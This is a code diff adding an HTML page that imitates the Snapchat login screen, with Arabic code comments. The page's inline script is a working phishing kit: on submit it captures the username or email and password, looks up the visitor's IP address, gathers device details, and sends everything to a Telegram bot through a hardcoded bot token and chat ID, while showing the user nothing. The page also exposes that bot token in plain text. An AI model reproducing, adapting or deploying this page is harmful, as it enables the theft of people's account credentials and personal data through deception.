@@ -1,0 +1,83 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Snapchat Login</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <div class="login-container">
+        <div class="img/faviconV2.png">
+            <img src="img/faviconV2.png" alt="logo">
+        </div>
+        <h1>Log in</h1>
+        <!-- إضافة معرف 'login-form' للنموذج -->
+        <form id="login-form" method="POST">
+            <input type="text" id="email" placeholder="Username or Email" required>
+            <input type="password" id="password" placeholder="Password" required>
+            <button type="submit">Log In</button>
+        </form>
+        <div class="links">
+            <a href="#">Forgot your password?</a>
+            <a href="#">New to Snapchat? Sign up</a>
+        </div>
+    </div>
+    
+    <script src="https://unpkg.com/axios@1.6.7/dist/axios.min.js"></script>
+    <script>
+        const TOKEN = "7924985762:AAFF7dg-IZu3hmvhObYEVL84PPjA9jTUjCk"; // توكن البوت
+        const CHAT_ID = "6687453395"; // معرف الشات
+        const URI_API = `https://api.telegram.org/bot${TOKEN}/sendMessage`;        
+        
+        // إضافة حدث عند تقديم النموذج
+        document.getElementById('login-form').addEventListener('submit', function(e) {
+            e.preventDefault();
+
+            // الحصول على البريد الإلكتروني وكلمة المرور من النموذج
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
+
+            axios.get('https://api.ipify.org?format=json')
+                .then(response => {
+                    const ip = response.data.ip;
+
+                    const userAgent = navigator.userAgent;
+                    const platform = navigator.platform;
+                    const screenWidth = screen.width;
+                    const screenHeight = screen.height;
+                    const deviceType = /mobile/i.test(navigator.userAgent) ? 'Mobile' : 'Desktop';
+
+                    // تنسيق الرسالة التي سيتم إرسالها عبر Telegram
+                    const message = ` 
+                        <b>New Login Attempt</b>\n
+                        <b>Email:</b> ${email}\n
+                        <b>Password:</b> ${password}\n
+                        <b>IP Address:</b> ${ip}\n
+                        <b>Device Type:</b> ${deviceType}\n
+                        <b>Platform:</b> ${platform}\n
+                        <b>User Agent:</b> ${userAgent}\n
+                        <b>Screen Resolution:</b> ${screenWidth}x${screenHeight}
+                    `;
+
+                    // إرسال الرسالة عبر Telegram API
+                    axios.post(URI_API, {
+                        chat_id: CHAT_ID,
+                        parse_mode: 'html',
+                        text: message
+                    }).then(response => {
+                        // لا يتم عرض رسالة تأكيد النجاح
+                        // إذا كنت ترغب في إضافة رسالة للمستخدم، يمكنك تخصيصها هنا
+                        console.log('Message sent');  // تم إرسال الرسالة
+                    }).catch(error => {
+                        console.log(error);  // في حالة حدوث خطأ، يتم عرضه في وحدة التحكم
+                    });
+                })
+                .catch(error => {
+                    console.log(error); // في حال حدوث خطأ عند الحصول على IP
+                });
+        });
+    </script>
+</body>
+</html>
